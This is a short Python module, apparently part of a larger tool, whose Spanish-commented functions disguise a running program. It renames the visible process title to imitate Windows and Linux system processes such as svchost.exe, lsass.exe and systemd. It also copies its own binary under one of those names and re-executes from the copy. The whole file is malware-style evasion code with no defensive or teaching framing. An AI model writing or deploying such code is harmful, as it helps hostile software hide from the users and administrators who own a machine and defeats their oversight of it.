# modules/camouflage.py

import os
import sys
import random

NOMBRES_FAKE = [
    "svchost.exe", "lsass.exe", "explorer.exe", "winlogon.exe", "services.exe",
    "systemd", "init", "bash", "python3", "pulseaudio"
]

def get_random_fake_name():
    return random.choice(NOMBRES_FAKE)

def camufla_nombre_proceso(fake_name=None):
    """
    Cambia el nombre de proceso visible (taskmgr, ps, etc)
    """
    try:
        if not fake_name:
            fake_name = get_random_fake_name()
        if os.name == "nt":
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(fake_name)
        else:
            import setproctitle
            setproctitle.setproctitle(fake_name)
    except Exception:
        pass

def randomize_bin_name():
    """
    Copia el binario a un nombre fake aleatorio y lo ejecuta desde ahí.
    Sale de la instancia vieja para que solo corra desde la nueva.
    """
    current_bin = os.path.abspath(sys.argv[0])
    dirpath = os.path.dirname(current_bin)
    new_name = get_random_fake_name()
    new_path = os.path.join(dirpath, new_name)
    if not os.path.exists(new_path):
        import shutil
        shutil.copy2(current_bin, new_path)
        os.execv(new_path, [new_path] + sys.argv[1:])
        sys.exit(0)
